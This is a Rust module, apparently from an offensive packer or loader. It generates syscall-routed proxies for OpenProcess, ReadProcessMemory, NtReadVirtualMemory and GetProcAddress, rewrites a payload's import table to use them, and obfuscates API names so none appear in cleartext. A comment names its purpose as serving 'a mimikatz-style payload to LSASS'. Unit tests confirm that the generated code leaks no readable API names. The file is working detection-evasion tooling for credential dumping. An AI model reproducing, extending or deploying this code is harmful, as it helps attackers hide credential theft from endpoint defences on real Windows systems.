//! API-resolution configuration and the proxy catalogue.
//!
//! `build.stub.api_resolution` (YAML) tells the loader to resolve the payload's
//! Windows API calls through a proxy generated in the stub instead of letting the
//! payload reach the real export. It is a *loader* concern, like
//! `build.stub.syscalls`, not a pipeline technique: it changes how the loader
//! resolves the payload's imports before running it.
//!
//! This module owns the **catalogue**: the closed, code-defined list of APIs an
//! operator may select. Adding an entry is a deliberate code change, because each
//! entry needs an implementation (how its proxy forwards or routes the call),
//! which is why the selection is validated against the catalogue instead of being
//! accepted as free-form text.
//!
//! `mode: proxy` rewrites the payload's IAT so catalogue hits land on the
//! generated proxies; every other import is forwarded, or refused when
//! `unmatched: abort`. The catalogue docs, phases and limitations live in
//! `docs/design/api-resolution.md`.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;
use crate::error::{PackerError, Result};

/// Raw `build.stub.api_resolution` YAML block, before semantic validation.
///
/// `mode` and `unmatched` are plain strings here so
/// [`ApiResolutionConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message, matching `YamlSyscallsPlan`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlApiResolutionPlan {
    /// Proxy mode (`none` or `proxy`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// Catalogue selections, written as `dll!function` (e.g.
    /// `kernel32!ReadProcessMemory`). The module side is normalized on lookup.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub apis: Vec<String>,

    /// What to do with imports not in the catalogue (`forward` or `abort`).
    #[serde(default = "default_unmatched")]
    pub unmatched: String,
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_unmatched() -> String {
    "forward".to_string()
}

/// Whether the loader proxies the payload's API resolution at all.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApiResolutionMode {
    /// The loader resolves imports as before; the block is a no-op.
    None,
    /// Catalogue hits are served by a proxy generated in the stub.
    Proxy,
}

/// What the loader does with an import that is *not* in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unmatched {
    /// Resolve it normally (no proxy).
    Forward,
    /// Abort the load.
    Abort,
}

/// What a generated proxy does with an intercepted call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Strategy {
    /// Call the original function (resolved dynamically, never imported).
    ///
    /// No shipped catalogue entry uses it today (see
    /// `docs/design/api-resolution.md`): it stays available for "thick" APIs
    /// that cannot be re-implemented on a syscall.
    #[allow(dead_code)]
    Forward,
    /// Re-implement the call on the native `Nt*` function via the syscall layer.
    RouteToNt,
    /// A handler that decides what to return (the `GetProcAddress` case).
    Handler,
}

/// One selectable API in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ApiEntry {
    /// Normalized module base name: lowercase, no `.dll` (e.g. `kernel32`).
    pub dll: &'static str,
    /// Export name (case-sensitive).
    pub func: &'static str,
    /// What the generated proxy does.
    pub strategy: Strategy,
    /// The `Nt*` function the proxy routes to (`RouteToNt` only).
    pub nt: Option<&'static str>,
}

impl ApiEntry {
    /// The `dll!func` selector used in the YAML.
    pub fn selector(&self) -> String {
        let (dll, func) = (self.dll, self.func);
        format!("{dll}!{func}")
    }
}

/// The catalogue of APIs an operator may select.
///
/// Minimal on purpose (see `docs/design/api-resolution.md`): the critical path of
/// a mimikatz-style payload to LSASS. `NtReadVirtualMemory` already exists in the
/// syscall layer; `NtOpenProcess` is added alongside it.
pub const CATALOGUE: &[ApiEntry] = &[
    ApiEntry {
        dll: "ntdll",
        func: "NtReadVirtualMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "ntdll",
        func: "NtOpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "ReadProcessMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "OpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "GetProcAddress",
        strategy: Strategy::Handler,
        nt: None,
    },
];

/// Resolved `build.stub.api_resolution` configuration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApiResolutionConfig {
    /// Whether the loader proxies API resolution at all.
    pub mode: ApiResolutionMode,
    /// Selected catalogue entries, in first-seen order and deduplicated.
    pub apis: Vec<&'static ApiEntry>,
    /// What to do with imports not in the catalogue.
    pub unmatched: Unmatched,
}

impl Default for ApiResolutionConfig {
    fn default() -> Self {
        Self {
            mode: ApiResolutionMode::None,
            apis: Vec::new(),
            unmatched: Unmatched::Forward,
        }
    }
}

impl ApiResolutionConfig {
    /// Resolves the configuration from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `unmatched: forward`, no APIs).
    /// An unknown mode/unmatched value, a malformed selector, or a name that is
    /// not in the catalogue is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlApiResolutionPlan>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => ApiResolutionMode::None,
            "proxy" => ApiResolutionMode::Proxy,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.mode '{other}': expected 'none' or 'proxy'"
                )));
            }
        };

        let unmatched = match yaml.unmatched.as_str() {
            "forward" => Unmatched::Forward,
            "abort" => Unmatched::Abort,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.unmatched '{other}': expected 'forward' or \
                     'abort'"
                )));
            }
        };

        let mut apis: Vec<&'static ApiEntry> = Vec::new();
        for selector in &yaml.apis {
            let entry = lookup(selector).ok_or_else(|| unknown_api(selector))?;
            if !apis.iter().any(|e| std::ptr::eq(*e, entry)) {
                apis.push(entry);
            }
        }

        Ok(Self {
            mode,
            apis,
            unmatched,
        })
    }

    /// Whether the configuration does nothing at build time.
    ///
    /// True when the mode is `none`, or when `proxy` declares no API to intercept.
    pub fn is_noop(&self) -> bool {
        self.mode == ApiResolutionMode::None || self.apis.is_empty()
    }
}

/// Looks up a `dll!func` selector (module side normalized) in the catalogue.
fn lookup(selector: &str) -> Option<&'static ApiEntry> {
    let (dll, func) = selector.split_once('!')?;
    let dll = normalize_module(dll);
    CATALOGUE
        .iter()
        .find(|entry| entry.dll == dll.as_str() && entry.func == func)
}

/// Normalizes a module name for comparison: file-name component only, a trailing
/// `.dll` stripped (case-insensitively), ASCII-lowercased.
///
/// The resolver and the generated `GetProcAddress` handler normalize both sides
/// the same way, so `kernel32`, `KERNEL32.DLL` and a full path all match.
fn normalize_module(name: &str) -> String {
    let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
    let lower = base.to_ascii_lowercase();
    lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
}

/// The error for a selector that is not in the catalogue.
fn unknown_api(selector: &str) -> PackerError {
    let known = CATALOGUE
        .iter()
        .map(ApiEntry::selector)
        .collect::<Vec<_>>()
        .join(", ");
    PackerError::Validation(format!(
        "unknown build.stub.api_resolution.apis entry '{selector}': not in the catalogue ({known})"
    ))
}

/// The `Nt*` functions the selected proxies route to.
impl ApiResolutionConfig {
    /// The `Nt*` helpers the syscall layer must provide for the selected
    /// `route_to_nt` entries, deduplicated and in the catalogue order.
    pub fn required_syscalls(&self) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = Vec::new();
        for entry in &self.apis {
            if entry.strategy == Strategy::RouteToNt {
                if let Some(nt) = entry.nt {
                    if !out.contains(&nt) {
                        out.push(nt);
                    }
                }
            }
        }
        out
    }
}

/// Renders the `$API_RESOLUTION_BLOCK$` fragment for the given configuration.
///
/// Emits a no-op `resolution_policy` when nothing is proxied (the execution
/// fragment always calls it), or the selected proxies plus the policy that maps
/// each intercepted `(module, function)` to its proxy. Imports outside the
/// catalogue resolve normally, or fail the load when `unmatched: abort`. Every
/// API name is rebuilt at runtime from `strings`; the names appear only in
/// comments (stripped from the source-literal guard) and in `proxy_<index>`
/// identifiers.
pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> String {
    if config.mode != ApiResolutionMode::Proxy || config.apis.is_empty() {
        return NOOP_BLOCK.to_string();
    }

    let mut proxies = String::new();
    let mut matches = String::new();

    for (index, entry) in config.apis.iter().enumerate() {
        proxies.push_str(&proxy_body(index, entry, strings));
        proxies.push('\n');

        let module_def = strings
            .obfuscate(entry.dll)
            .render_stub_expr(&format!("intercept_{index}_module"));
        let function_def = strings
            .obfuscate(entry.func)
            .render_stub_expr(&format!("intercept_{index}_function"));
        matches.push_str(&format!(
            "        {{\n            let want_module: String = {module_def};\n            let want_function: String = \
             {function_def};\n            if module == want_module.as_str() && func == \
             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
             }}\n"
        ));
    }

    let miss = match config.unmatched {
        Unmatched::Forward => "crate::ImportPolicy::Forward",
        Unmatched::Abort => "crate::ImportPolicy::Abort",
    };

    BLOCK_TEMPLATE
        .replace("$POLICY_MATCHES$", matches.trim_end())
        .replace("$MISS_DECISION$", miss)
        .replace("$PROXIES$", proxies.trim_end())
}

/// Index-based proxy id. The API name is kept only in comments so nothing but
/// obfuscated bytes carries it into the source or the binary.
fn proxy_id(index: usize) -> String {
    format!("proxy_{index}")
}

/// The body of the proxy for one selected entry.
fn proxy_body(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    match entry.func {
        "NtReadVirtualMemory" => DIRECT_NT_READ_VM
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "ReadProcessMemory" => WRAPPER_READ_PROCESS_MEMORY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "NtOpenProcess" => DIRECT_NT_OPEN_PROCESS
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenProcess" => REBUILD_OPEN_PROCESS
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "GetProcAddress" => handler_proxy(index, entry, strings),
        // Unreachable for the shipped catalogue; kept so an entry without a body
        // is visible in the generated source instead of referencing a missing
        // function.
        _ => format!("    // {comment}: no proxy body is implemented yet\n"),
    }
}

/// A `GetProcAddress` handler: catalogue hits get their proxy, everything else
/// (including ordinals) is forwarded to the original resolver.
fn handler_proxy(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    let id = proxy_id(index);
    let comment = format!("handler for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    HANDLER_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

/// A forwarding proxy: calls the original export, resolved at runtime.
#[allow(dead_code)]
fn forward_proxy(
    index: usize,
    entry: &ApiEntry,
    strings: &StringsConfig,
    params: &str,
    types: &str,
    ret: &str,
    args: &str,
) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    FORWARD_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$PARAMS$", params)
        .replace("$TYPES$", types)
        .replace("$RET$", ret)
        .replace("$ARGS$", args)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

const NOOP_BLOCK: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// No API is proxied: the loader resolves the payload's imports normally.
mod api_resolution {
    /// Nothing is proxied in this build: every import is resolved normally.
    #[allow(dead_code)]
    pub fn resolution_policy(_dll: &str, _func: &str) -> crate::ImportPolicy {
        crate::ImportPolicy::Forward
    }
}
use api_resolution::resolution_policy;
"#;

const BLOCK_TEMPLATE: &str = r#"// --- API resolution (build.stub.api_resolution) ---
// The loader serves the selected APIs from a proxy generated here, so the
// intercepted calls leave the payload's IAT and (route_to_nt) reach the kernel
// through the syscall layer. The names are rebuilt at runtime from obfuscated
// bytes; only the comments carry them in clear.
mod api_resolution {
    /// Decides how one payload import slot is served: a generated proxy, the
    /// real export, or a refusal (`unmatched: abort`).
    #[allow(dead_code)]
    pub fn resolution_policy(dll: &str, func: &str) -> crate::ImportPolicy {
        let module = normalize_module(dll);
$POLICY_MATCHES$
        $MISS_DECISION$
    }

    /// Normalizes a module name for comparison: the file-name component, a
    /// trailing `.dll` stripped (case-insensitively), ASCII-lowercased.
    fn normalize_module(name: &str) -> String {
        let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
        let lower = base.to_ascii_lowercase();
        lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
    }

$PROXIES$
}
use api_resolution::resolution_policy;
"#;

const DIRECT_NT_READ_VM: &str = r#"    /// $COMMENT$: routed through the syscall layer.
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
        crate::nt_read_vm(process, base, buffer, size, read)
    }
"#;

const WRAPPER_READ_PROCESS_MEMORY: &str = r#"    /// $COMMENT$: the Win32 wrapper re-implemented on NtReadVirtualMemory
    /// (NTSTATUS -> BOOL, `GetLastError` preserved, partial count kept).
    extern "system" fn $ID$(
        process: windows::Win32::Foundation::HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
        let status = crate::nt_read_vm(process, base, buffer, size, read);
        if status >= 0 {
            return 1;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const DIRECT_NT_OPEN_PROCESS: &str = r#"    /// $COMMENT$: routed through the syscall layer.
    extern "system" fn $ID$(
        handle: *mut core::ffi::c_void,
        access: u32,
        attributes: *const core::ffi::c_void,
        client_id: *const core::ffi::c_void,
    ) -> i32 {
        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
        crate::nt_open_process(handle, access, attributes, client_id)
    }
"#;

const REBUILD_OPEN_PROCESS: &str = r#"    /// $COMMENT$: rebuilt on NtOpenProcess (`OBJECT_ATTRIBUTES` + `CLIENT_ID`).
    ///
    /// The Win32 `PROCESS_*` access constants are the NT access masks, so
    /// `desired_access` is passed through unchanged; `inherit` maps to
    /// `OBJ_INHERIT`. Fidelity risk: `OpenProcess` documents `ERROR_INVALID_
    /// PARAMETER` for a zero access mask and `ERROR_ACCESS_DENIED` on refusal;
    /// those come back through `RtlNtStatusToDosError`.
    extern "system" fn $ID$(desired_access: u32, inherit: i32, process_id: u32) -> isize {
        #[repr(C)]
        struct ObjectAttributes {
            length: u32,
            root_directory: *mut core::ffi::c_void,
            object_name: *const core::ffi::c_void,
            attributes: u32,
            security_descriptor: *const core::ffi::c_void,
            security_quality_of_service: *const core::ffi::c_void,
        }
        #[repr(C)]
        struct ClientId {
            unique_process: *mut core::ffi::c_void,
            unique_thread: *mut core::ffi::c_void,
        }

        const OBJ_INHERIT: u32 = 0x0000_0002;
        crate::tech_dbg!("api_resolution", "an intercepted call was routed to the syscall layer");
        let attributes = ObjectAttributes {
            length: core::mem::size_of::<ObjectAttributes>() as u32,
            root_directory: core::ptr::null_mut(),
            object_name: core::ptr::null(),
            attributes: if inherit != 0 { OBJ_INHERIT } else { 0 },
            security_descriptor: core::ptr::null(),
            security_quality_of_service: core::ptr::null(),
        };
        let client_id = ClientId {
            unique_process: process_id as usize as *mut core::ffi::c_void,
            unique_thread: core::ptr::null_mut(),
        };
        let mut handle: isize = 0;
        let status = crate::nt_open_process(
            &mut handle as *mut isize as *mut core::ffi::c_void,
            desired_access,
            &attributes as *const ObjectAttributes as *const core::ffi::c_void,
            &client_id as *const ClientId as *const core::ffi::c_void,
        );
        if status >= 0 {
            return handle;
        }
        unsafe {
            windows::Win32::Foundation::SetLastError(windows::Win32::Foundation::WIN32_ERROR(
                windows::Win32::Foundation::RtlNtStatusToDosError(
                    windows::Win32::Foundation::NTSTATUS(status),
                ),
            ));
        }
        0
    }
"#;

const HANDLER_TEMPLATE: &str = r#"    /// $COMMENT$: decides what to return. Catalogue hits get their proxy,
    /// everything else (including ordinals) is forwarded to the original.
    extern "system" fn $PROXY$(module: isize, name: *const u8) -> isize {
        unsafe {
            // A name pointer with a zero high word is an ordinal: forward it.
            if (name as usize) >> 16 != 0 {
                let wanted = std::ffi::CStr::from_ptr(name as *const i8);
                if let Ok(func) = wanted.to_str() {
                    let mut buf = [0u8; 260];
                    let len = windows::Win32::System::LibraryLoader::GetModuleFileNameA(
                        windows::Win32::Foundation::HMODULE(module as *mut core::ffi::c_void),
                        &mut buf,
                    );
                    if len > 0 {
                        let path = String::from_utf8_lossy(&buf[..len as usize]);
                        if let crate::ImportPolicy::Proxy(proxy) = resolution_policy(&path, func) {
                            crate::tech_dbg!(
                                "api_resolution",
                                "an intercepted resolution returned a proxy"
                            );
                            return proxy as isize;
                        }
                    }
                }
            }
            crate::tech_dbg!(
                "api_resolution",
                "an intercepted resolution was forwarded to the original"
            );
            let target: extern "system" fn(isize, *const u8) -> isize =
                core::mem::transmute($ORIGINAL$());
            target(module, name)
        }
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

const FORWARD_TEMPLATE: &str = r#"    /// $COMMENT$: forwards to the original export, resolved at runtime (the
    /// intercepted name is never imported).
    extern "system" fn $PROXY$($PARAMS$) -> $RET$ {
        crate::tech_dbg!("api_resolution", "an intercepted call was forwarded to the original");
        let original = $ORIGINAL$();
        let target: extern "system" fn($TYPES$) -> $RET$ =
            unsafe { core::mem::transmute(original) };
        target($ARGS$)
    }

    /// Resolves the original export once.
    fn $ORIGINAL$() -> usize {
        static ORIGINAL: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
        *ORIGINAL.get_or_init(|| unsafe {
            let want_dll: String = $DLL_DEF$;
            let want_func: String = $FUNC_DEF$;
            let (Ok(dll), Ok(func)) =
                (std::ffi::CString::new(want_dll), std::ffi::CString::new(want_func))
            else {
                return 0;
            };
            let Ok(module) = windows::Win32::System::LibraryLoader::GetModuleHandleA(
                windows::core::PCSTR(dll.as_ptr() as *const u8),
            ) else {
                return 0;
            };
            match windows::Win32::System::LibraryLoader::GetProcAddress(
                module,
                windows::core::PCSTR(func.as_ptr() as *const u8),
            ) {
                Some(address) => address as usize,
                None => 0,
            }
        })
    }
"#;

#[cfg(test)]
mod tests {
    use super::*;

    fn yaml(s: &str) -> YamlApiResolutionPlan {
        serde_yml::from_str(s).expect("valid YAML")
    }

    #[test]
    fn absent_block_defaults_to_none_and_is_a_noop() {
        let config = ApiResolutionConfig::from_yaml(None).expect("defaults");
        assert_eq!(config.mode, ApiResolutionMode::None);
        assert_eq!(config.unmatched, Unmatched::Forward);
        assert!(config.apis.is_empty());
        assert!(config.is_noop());
    }

    #[test]
    fn yaml_defaults_are_none_and_forward() {
        let config = ApiResolutionConfig::from_yaml(Some(&yaml("{}"))).expect("defaults");
        assert_eq!(config.mode, ApiResolutionMode::None);
        assert_eq!(config.unmatched, Unmatched::Forward);
    }

    #[test]
    fn parses_proxy_with_catalogue_apis() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"kernel32!ReadProcessMemory\"\n  - \"ntdll!NtOpenProcess\"\nunmatched: abort\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.mode, ApiResolutionMode::Proxy);
        assert_eq!(config.unmatched, Unmatched::Abort);
        assert_eq!(config.apis.len(), 2);
        assert_eq!(config.apis[0].func, "ReadProcessMemory");
        assert_eq!(config.apis[1].func, "NtOpenProcess");
        assert!(!config.is_noop());
    }

    #[test]
    fn module_name_is_normalized() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"KERNEL32.DLL!ReadProcessMemory\"\n  - \"C:/Windows/System32/ntdll!NtReadVirtualMemory\"\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.apis.len(), 2);
        assert_eq!(config.apis[0].func, "ReadProcessMemory");
        assert_eq!(config.apis[1].func, "NtReadVirtualMemory");
    }

    #[test]
    fn repeated_apis_are_deduplicated() {
        let y = yaml(
            "mode: proxy\napis:\n  - \"kernel32!ReadProcessMemory\"\n  - \"KERNEL32!ReadProcessMemory\"\n",
        );
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert_eq!(config.apis.len(), 1);
    }

    #[test]
    fn a_proxy_with_no_apis_is_a_noop() {
        let y = yaml("mode: proxy\n");
        let config = ApiResolutionConfig::from_yaml(Some(&y)).expect("valid");
        assert!(config.is_noop());
    }

    #[test]
    fn rejects_an_unknown_mode() {
        let y = yaml("mode: intercept\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown mode");
        assert!(
            err.to_string().contains("api_resolution.mode"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_unknown_unmatched() {
        let y = yaml("mode: proxy\nunmatched: deny\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown unmatched");
        assert!(
            err.to_string().contains("api_resolution.unmatched"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_an_api_outside_the_catalogue() {
        let y = yaml("mode: proxy\napis:\n  - \"kernel32!Nope\"\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("unknown api");
        assert!(
            err.to_string().contains("api_resolution.apis"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn rejects_a_selector_without_a_module() {
        let y = yaml("mode: proxy\napis:\n  - \"ReadProcessMemory\"\n");
        let err = ApiResolutionConfig::from_yaml(Some(&y)).expect_err("malformed selector");
        assert!(
            err.to_string().contains("api_resolution.apis"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn selectors_are_unique_and_well_formed() {
        let mut seen = std::collections::BTreeSet::new();
        for entry in CATALOGUE {
            assert!(!entry.dll.is_empty());
            assert!(!entry.func.is_empty());
            assert_eq!(
                entry.dll,
                normalize_module(entry.dll),
                "catalogue dll must be pre-normalized"
            );
            assert!(seen.insert(entry.selector()), "duplicate selector");
            if entry.strategy == Strategy::RouteToNt {
                assert!(
                    entry.nt.is_some(),
                    "{} needs an Nt* target",
                    entry.selector()
                );
            }
        }
    }

    fn xor_strings() -> StringsConfig {
        StringsConfig {
            strategy: crate::engine::obfuscation::StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn proxy_config(apis: &[&str]) -> ApiResolutionConfig {
        let list: String = apis.iter().map(|a| format!("  - \"{a}\"\n")).collect();
        let y = yaml(&format!("mode: proxy\napis:\n{list}"));
        ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
    }

    fn proxy_config_with_unmatched(apis: &[&str], unmatched: &str) -> ApiResolutionConfig {
        let list: String = apis.iter().map(|a| format!("  - \"{a}\"\n")).collect();
        let y = yaml(&format!(
            "mode: proxy\napis:\n{list}unmatched: {unmatched}\n"
        ));
        ApiResolutionConfig::from_yaml(Some(&y)).expect("valid")
    }

    /// The generated code with comment lines removed (comments may name APIs).
    fn code_only(source: &str) -> String {
        source
            .lines()
            .filter(|line| !line.trim_start().starts_with("//"))
            .collect::<Vec<_>>()
            .join("\n")
    }

    #[test]
    fn noop_block_when_nothing_is_proxied() {
        let block = render_block(&ApiResolutionConfig::default(), &xor_strings());
        assert!(block.contains("pub fn resolution_policy"));
        assert!(block.contains("crate::ImportPolicy::Forward"));
        assert!(!block.contains("proxy_0"));
    }

    #[test]
    fn renders_proxies_and_policy_without_cleartext_names() {
        let config = proxy_config(&["kernel32!ReadProcessMemory", "ntdll!NtReadVirtualMemory"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("proxy_0"));
        assert!(block.contains("proxy_1"));
        assert!(block.contains("fn resolution_policy"));
        assert!(block.contains("crate::ImportPolicy::Proxy("));
        assert!(block.contains("normalize_module"));
        assert!(block.contains("crate::nt_read_vm"));
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
        let code = code_only(&block);
        assert!(!code.contains("ReadProcessMemory"), "cleartext name leaked");
        assert!(
            !code.contains("NtReadVirtualMemory"),
            "cleartext name leaked"
        );
    }

    #[test]
    fn forward_strategy_renders_a_runtime_resolver() {
        // No shipped catalogue entry uses `forward` any more (OpenProcess is a
        // rebuild, GetProcAddress is the handler); the strategy stays available
        // for future "thick" APIs, so it is exercised directly.
        let entry = ApiEntry {
            dll: "kernel32",
            func: "SomeThickApi",
            strategy: Strategy::Forward,
            nt: None,
        };
        let body = forward_proxy(0, &entry, &xor_strings(), "a: u32", "u32", "u32", "a");
        assert!(body.contains("original_0"));
        assert!(body.contains("GetModuleHandleA"));
        assert!(body.contains("OnceLock"));
        let code = code_only(&body);
        assert!(!code.contains("SomeThickApi"), "cleartext name leaked");
    }

    #[test]
    fn handler_entry_renders_the_module_lookup() {
        let config = proxy_config(&["kernel32!GetProcAddress"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("GetModuleFileNameA"));
        assert!(block.contains("resolution_policy(&path, func)"));
        assert!(block.contains("crate::ImportPolicy::Proxy("));
        assert!(block.contains("original_0"));
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    /// `unmatched` picks the policy's miss arm: `forward` resolves normally,
    /// `abort` returns `ImportPolicy::Abort` so the load fails (finding 1).
    #[test]
    fn unmatched_selects_the_miss_decision() {
        let forward = proxy_config(&["kernel32!ReadProcessMemory"]);
        let block = render_block(&forward, &xor_strings());
        assert!(
            block.contains("crate::ImportPolicy::Forward")
                && !block.contains("ImportPolicy::Abort"),
            "forward should be the miss arm: {block}"
        );

        let abort = proxy_config_with_unmatched(&["kernel32!ReadProcessMemory"], "abort");
        let block = render_block(&abort, &xor_strings());
        assert!(
            block.contains("crate::ImportPolicy::Abort")
                && !block.contains("ImportPolicy::Forward"),
            "abort should be the miss arm: {block}"
        );
        assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
    }

    #[test]
    fn rebuild_entry_defines_the_native_structures() {
        let config = proxy_config(&["kernel32!OpenProcess"]);
        let block = render_block(&config, &xor_strings());
        assert!(block.contains("struct ObjectAttributes"));
        assert!(block.contains("struct ClientId"));
        assert!(block.contains("OBJ_INHERIT"));
        assert!(block.contains("crate::nt_open_process"));
    }

    #[test]
    fn every_catalogue_entry_has_a_proxy_body() {
        for entry in CATALOGUE {
            let body = proxy_body(0, entry, &xor_strings());
            assert!(
                code_only(&body).contains("proxy_0"),
                "no proxy body for {}",
                entry.selector()
            );
        }
    }

    #[test]
    fn required_syscalls_lists_the_route_targets() {
        let config = proxy_config(&[
            "kernel32!ReadProcessMemory",
            "ntdll!NtReadVirtualMemory",
            "kernel32!OpenProcess",
        ]);
        assert_eq!(
            config.required_syscalls(),
            vec!["NtReadVirtualMemory", "NtOpenProcess"]
        );
    }
}
